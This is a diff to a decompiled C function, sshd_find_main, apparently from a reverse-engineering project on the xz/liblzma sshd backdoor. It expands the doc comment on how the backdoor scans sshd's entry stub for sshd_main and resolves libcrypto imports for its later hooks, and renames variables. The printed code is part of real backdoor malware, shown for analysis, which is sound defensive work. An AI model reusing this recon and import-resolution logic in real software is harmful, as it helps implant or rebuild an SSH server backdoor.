@@ -5,7 +5,11 @@
 
 
 /*
- * AutoDoc: Scans sshd's entry-point stub to locate the real sshd_main function and prefetch key libcrypto imports. The backdoor needs that entry address as the anchor for later monitor-structure searches and to seed its imported_funcs table before hooks fire.
+ * AutoDoc: Obtains sshd's code segment, decodes the entry stub, and looks for the instruction pair that
+ * loads the real `sshd_main` address right before the `__libc_start_main` thunk. When it sees a
+ * matching MOV/LEA that targets the GOT slot for libc's entry point it records the discovered
+ * `sshd_main`, resolves EVP_Digest/EVP_sha256, and caches the stub pointers inside
+ * `imported_funcs` so later recon code can reuse them without reopening libcrypto.
  */
 #include "xzre_types.h"
 
@@ -17,7 +21,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
   Elf64_Addr EVar1;
   Elf64_Ehdr *pEVar2;
   BOOL BVar3;
-  lzma_allocator *allocator;
+  lzma_allocator *allocator_00;
   u8 *puVar4;
   _func_40 *p_Var5;
   u8 *puVar6;
@@ -30,6 +34,11 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
   u8 *puVar11;
   u8 *puVar12;
   byte bVar13;
+  lzma_allocator *allocator;
+  u8 *code_segment_start;
+  u8 *code_segment_end;
+  u8 *libc_start_main_got;
+  u8 *sshd_main_candidate;
   u64 local_88;
   u8 *local_80;
   u64 local_78;
@@ -41,12 +50,12 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
   
   bVar13 = 0;
   local_88 = 0;
-  allocator = get_lzma_allocator();
-  allocator->opaque = libcrypto;
+  allocator_00 = get_lzma_allocator();
+  allocator_00->opaque = libcrypto;
   puVar4 = (u8 *)elf_get_code_segment(sshd,&local_88);
   if (puVar4 != (u8 *)0x0) {
     puVar12 = puVar4 + local_88;
-    p_Var5 = (_func_40 *)lzma_alloc(0x758,allocator);
+    p_Var5 = (_func_40 *)lzma_alloc(0x758,allocator_00);
     imported_funcs->EVP_PKEY_new_raw_public_key = p_Var5;
     if (p_Var5 != (_func_40 *)0x0) {
       imported_funcs->resolved_imports_count = imported_funcs->resolved_imports_count + 1;
@@ -102,7 +111,7 @@ BOOL sshd_find_main(u8 **code_start_out,elf_info_t *sshd,elf_info_t *libcrypto,
         }
       }
     }
-    lzma_free(imported_funcs->EVP_PKEY_new_raw_public_key,allocator);
+    lzma_free(imported_funcs->EVP_PKEY_new_raw_public_key,allocator_00);
   }
   return 0;
 }
